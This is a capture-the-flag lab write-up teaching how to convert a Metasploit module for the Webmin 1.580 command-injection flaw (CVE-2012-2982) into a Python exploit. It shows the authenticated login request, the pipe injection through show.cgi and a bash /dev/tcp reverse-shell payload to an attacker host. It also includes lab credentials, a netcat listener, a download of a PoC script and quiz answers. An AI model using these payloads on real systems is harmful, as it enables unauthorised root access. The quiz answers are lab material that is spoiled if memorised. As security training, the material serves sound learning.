# Intro PoC Scripting

## Introduction – What are PoC Scripts?

This room is an introduction to a fundamental skill of most cybersecurity domains; exploit development by crafting exploit scripts from proof of concept code.

**proof of concept (PoC)**: evidence, typically derived from an experiment or pilot project, which demonstrates that a design concept, business proposal, etc., is feasible.

A Proof of Concept (PoC) is a small test or trial that shows your idea can actually work in real life.

Not every vulnerability that exists will have a pre-made exploit script to use but, if you learn and practice how to make them yourself, you'll acquire a deeper understanding of cybersecurity topics and accumulate more technical skills.

### Methodologies

A handful of common methodologies I've found thus far include:
- Optimize the script and condense unnecessary code: keep it simple stupid
- Read and reread PoC code before researching: assists in identifying errors in scripts and how to fix them, sometimes before they occur
- Research as detailed as possible: not all essential information is found on documentation and stackoverflow
- Prepare to adapt and customize: PoC code sometimes uses pre-made libraries with specific functions you'll need to personally craft
- Test segments of code along the way: this makes it easier to pinpoint potential issues

## Example – The Starting Point

In terms of CTFs, vulnerability scanning, penetration testing, and across an extensive array of security fields, writing PoC scripts can be used to assist or completely accomplish one's task a majority of the time.

Credentials 

username: user1

password: 1user

We can use a native Kali tool `searchsploit` to inspect the platform and version number, it parses the exploit-db website for known exploits.

`searchsploit webmin 1.580`

The module exploits an arbitrary command execution vulnerability in Webmin 1.580, CVE-2012-2982. The vulnerability exists in the `/file/show.cgi` component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges.

On the surface level, we know that we can execute any program we want on this Ubuntu server. In most scenarios it makes sense to execute the system shell, especially when we have root or administrator privileges. It enables us to have complete control over the target system and manipulate it to our needs.

This means that an input invalidation flaw within the binary file of `show.cgi`, exploited using a | (pipe) character, allows for remote authenticated attackers to execute any command as a privileged user. Meaning all we need to do is input invalid characters and pipe those to a system command (system shell). We can execute the payload, open a socket connection and send it back to the attacker listening with `netcat`

### Answer the questions below

1. What is the target's platform and version number?

Webmin 1.580

2. What is the associated CVE for this platform?

CVE-2012-2982

3. Which file does the vulnerability exist in?

`file/show.cgi`

4. What program/command would be the most effective to use in this exploit?

System shell

## Translating Metasploit module code

The source code can be broken up into three main functions; initialize, check and exploit. It would be most beneficial to inspect them separately.

### Initialize

<img width="975" height="997" alt="image" src="https://github.com/user-attachments/assets/fc0522f6-f1d3-427c-8a75-bdce7627e00e" />

There is little technicality in this function, but the purpose is to initialize the program with essentials. It begins with a description of the exploit, authors and reference sites of the shellcode and associated CVE. This conversion is mostly unessential and can be skipped.

There are a few simple parameters to take note of the update_info function that we might need to consider converting
- `Space = 512` - maximum space in memory to store the payload
- `PayloadType = cmd` - ensures that the payload the exploit uses is the cmd

And the `register_options` function
- `RPORT(10000)` - sets the target port
- `'SSL', [true, 'Use SSL', true]` - whether or not the site uses HTTPS (this didnt so set to false)
- `'USERNAME', [true, 'Webmin Username']` - accepts the username
- `'PASSWORD', [true, 'Webmin Password']` - accepts the password

Information to convert
- payload type: cmd or the system shell
- placeholder for the username and password
- RPORT: the website is on the default HTTP port 80 instead of 10000

Other information such as memory allocation is done automatically when using python so we can ignore this. The website does not use TLS so we'll have to note this in the POST request.

### Check

<img width="766" height="851" alt="image" src="https://github.com/user-attachments/assets/eb8b2d41-f9dd-4828-814e-93dd23294bf0" />

The purpose of this function is to verify that the target is vulnerable to CVE-2012-2982. As this function only exists to verify the vulnerability, it is expendable in our custom script. Let's breakdown this function line by line (I'll be skipping the print statements)
- `peer = "#{rhost}:#{rport}"` - reserves space for the target IP and port
- `data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"` - stores the URL that handles the login request
- `res = send_request_cgi({'method' => 'POST', 'uri' => "/session_login.cgi", 'cookie' => "testing=1", 'data' => data}, 25)` - sends an HTTP POST request to login with compromised credentials

The beginning portion of this function establishes the flow of the rest of the script

1. sets target IP and port
	
2. obtains Webmin login page URL
  
3. sends a POST request to the server

Here we simply have elements of a POST request, the login page, test cookie, and credentials. We know we need authenticated credentials in order to use this exploit, the POST request logs us in and assigns us a unique cookie to verify our local access privileges on the target and communicate as if we had a graphical interface.

The next section of the check function can be intimidating to beginners, but it's more simple than it appears. All this section does is format the unique cookie to exclude unnecessary text and generate a random string.
- `if res and res.code == 302 and res.get_cookies =~ /sid/` - if statement to continue if the HTTP response code is 302 and if the cookie equals the value of sid, session ID
- `session = res.get_cookies.split("sid=")[1].split(";")[0]` - formats the cookie into a readable string based on the Set-Cookie header in the HTTP response
- `command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"` - generates a random string of 5 alphanumeric characters to use as invalid input

This part has some important duties within the script. We verify that

1. the first POST request responds with a 302 (found) status code

2. the cookies are labeled as sid

3. format the cookies for excess text

4. generate the invalid input to pipe into the malicious command

The most important information in this section is the format of the unique cookie and generating a random alphanumeric string.

The cookie is formatted by reading the output of the Set-Cookie header. The actual cookie is a random alphanumeric string but there is other information (the name and path) that is apart of the header, this line of code simply gets rid of the excess information and stores the alphanumeric value. From the developer tools, we see the name sid proceeds the actual value, so the method split is used to split the text at "sid=" and returns an array, storing the alphanumeric value and the remaining text. It's then repeated to split at ";" and return an array with no elements, leaving only the alphanumeric cookie value.

The command variable uses echo to print five random alphanumeric characters to be used as invalid input to pipe to the malicious command, generating a random alphanumeric string.

Information to convert
- the login page URI data (credentials and login page file)
- POST request sending the URI data
- format the cookie
- HTTP response code and the session id is not empty
- generate five random characters

The second request simply checks if the target is vulnerable to the exploit, we'll discuss this in more detail below.

### Exploit

<img width="553" height="615" alt="image" src="https://github.com/user-attachments/assets/211c29ce-c9d7-4eaf-be5d-fbe7a52f793f" />

You may have noticed some similarities between the check and exploit functions, they are identical aside from the fact that the exploit function sends the actual payload. The initial POST request, formatting cookies and second request to send the payload are identical to the check function. This makes this script easier for us as we can condense redundant code.

The main difference in this exploit is the change of the command variable. We can see with `payload.encode`d that instead of merely testing if the website is vulnerable, we are sending data (the shell) over a network back to our attacking machine. In order for data to be properly sent through a URL, some exploits require URL encoding. Here metasploit is using it as insurance because as we'll see in the next task, in this scenario it doesn't need to be encoded manually because the payload does not break in transit.

The module does not specify the type of request, therefore using the default GET method. It sends a request with the authenticated cookie to the file that houses the vulnerability `show.cgi` and enters the invalid input, piping it with `|` to the malicious command, the system shell. As metasploit automatically establishes a socket connection between the target and attacker, we'll have include a line to open a socket on the victim in order to send the system shell back to us.

Information to convert
- store the system shell with a function, encode it and send it back via socket
- send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command

At this point we know exactly what information we need in order to convert this ruby code to python, lets review everything so far.

Information to convert
- payload type: cmd or system shell
- the login page URI data (credentials, receiving port and login page file)
- POST request sending the URI data
- format the cookie
- verify HTTP response code and the session id is not empty, print statement to verify success
- generate five random characters
- store the system shell with a function, encode it and send it back via socket
- send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command 

### Answer the questions below

1. What's the original disclosure date of this exploit?

September 6 2012

2. What HTTP response code do we expect after the initial POST request?

302

3. What does sid stand for and what is it's purpose?

Session ID, Authentication

4. In the check function, what is it doing to the cookies?

Format

5. In the second request of the check function, what method is piped into the command?

`rand_text_alphanumeric`

## Converting Ruby to Python

Similar to the metasploit module, we can dissect our exploit into three main parts; initialize payload, login, exploit.

### Initialize Payload

The most important task here is to enable python to execute the system shell `/bin/sh` or `/bin/bash`. Python has numerous ways to execute system programs natively but remember, we have the ability of arbitrary command execution, meaning that we can use whatever command (not just python code) necessary to establish a reverse shell including with Python, Bash, Ruby, netcat, PHP, socat and a plethora of other commands available to us.

As discussed in more detail below, the simplest way to open a connection to the attacker and send the shell will be to run a bash command executing a reverse shell.

Our initialization will be `payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

### Login

In some cases, especially when researching, it is necessary to check if the target is vulnerable to the exploit by sending a test command like the author of the metasploit module included. For the purposes of this room because we already confirmed the CVE, we can condense the steps to login once, return if 302 status code and return the sid cookie to use in the payload POST request. The request should be fairly simple and we can go down our list item by item, using the requests library
- the login page URI data (credentials, receiving port and login page file)
- POST request sending the URI data
- format the cookie
- verify HTTP response code and the session id is not empty, print statement to verify success

POST requests in python can send data to a server via a dictionary, list of tuples, bytes or a file object. We only need three items to send as data, the page, username, and password. From the developer tools we know the exact labels of each of these; page, user, and pass.

`data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}`

We can include a variable with the file to target using f-strings. We know the receiving port is the default port 80 so we don't need to include it manually.

`url = f"http://{targetIP}/session_login.cgi"`

Now we have all of the information we need to login via POST request. We'll be sending the credentials, the test cookie with its value, as well as ignoring TLS and site redirects.

`r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)`

Next we can include the if statement. We can check the status code and verify the cookies aren't empty using methods from the requests module.

`if r.status_code == 302 and r.cookies["sid"] != None`

In the metasploit module, the manual formatting of cookies with `.split()` is necessary but this is not the case in python. While we are able to include several methods to obtain the alphanumeric cookie, we can simply read the value from the header directly with `r.cookies["sid"]`

### Exploit

The exploit section of our code will also be straightforward. We will write functions to generate five random alphanumeric characters stored in a string and a payload which opens the shell via bash and captures the output to send via a GET or POST request.

The simplest way to execute the payload would be to replicate the original ruby program by formatting it inside of the URL. This saves space and makes the program clearer by directly piping the invalid character to the payload. In order to do this, we'll have to analyze the type of data we're dealing with. For data to be used in conjunction, it must be of the same type. Our random character and payload functions must both be strings to be formatted in the URL.

`exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"`

Using the string and secrets modules we're able to make a function that randomly prints five alphanumeric character. The strings library does not have a native alphanumeric method, so I had to combine methods representing single digits and all cases alphabet letters.

`alphaNum = string.ascii_letters + string.digits`

We can then input this variable to be randomly generated with five characters 

`randChar = ''.join(secrets.choice(alphaNum) for i in range(5))`

### payload()

There are numerous ways to execute the system shell on Linux as we have the freedom to execute any command that we want. In this scenario we will save steps and space by using bash to open a connection to the attacker and send the shell. 

<img width="975" height="198" alt="image" src="https://github.com/user-attachments/assets/9edb6e6d-9ed2-4e8e-86db-6a672f4e8a11" />

The first command listed `bash -i` is a popular one line command to establish an interactive reverse shell on a system. This will be the basis for our `payload()` function but it does require some tweaks. While it executes a reverse shell, we are missing a key point. Without specifying what to do with the bash shell that executes on boot, the system is unable to distinguish between separate processes of bash. To fix this, we can use `bash -c 'exec bash -i xyz'`

`exec` completely replaces the current running process. The current shell process is destroyed and entirely replaced by the command we specify which will be the reverse shell `bash -i &>/dev/tcp/TARGET_IP/PORT`

The purpose of "<&1" is to redirect the output stream (1, stdout) of the TCP socket to the input stream (0, stdin) of the bash shell and create a reverse shell. Bash opens a TCP socket on the target machine through the given port and makes a request to the given IP (the attacker). The output stream of the socket is then redirected to the input steam of the new bash shell, sending the shell process through the socket. The ampersand character "&" acts as a reference to the I/O socket streams.

`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

Lastly, all we need is the second request with the authenticated cookie. The module did not specify whether to use a POST or GET method however, in this scenario either method works.

`req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)`

### Answer the questions below

1. Which HTTP response header allows us to send an authenticated POST request?

Set-Cookie

2. Which is the correct method for formatting cookies in this example?

`r.headers().replace().split().strip()`

`r.headers().split().strip()`

`a = r.cookies()` `b = a.strip()`

Answer: Any

3. What data type does the payload need to be?

String

4. Why do we need to use "bash -c exec" instead of just "bash -i"

Replaces current shell process

5. What is the purpose of "<&1" in the payload function?

Redirects socket output stream to bash input stream

## Final Exploit and Test

We're ready to test the final script, run the following commands:

`wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py`

Change your attacker IP (tun0 address) and listener port 5353 using nano and listen for the shell with `nc -nlvp 5353`

`python3 web.py <targetIP>` if you receive errors about missing libraries, install them with pip

Move to the root directory and check the contents of root.txt

### Answer the questions below

Run the program and listen for the shell. What is the /root/root.txt flag?

<img width="310" height="191" alt="image" src="https://github.com/user-attachments/assets/95007632-1089-4ade-bb6f-b1b562b62258" />

## Common Mistakes

When writing exploits, the goal is not to use complex code or use more than is necessary for the task.

If we wanted to execute the system shell strictly with python, we can use the subprocess module. 
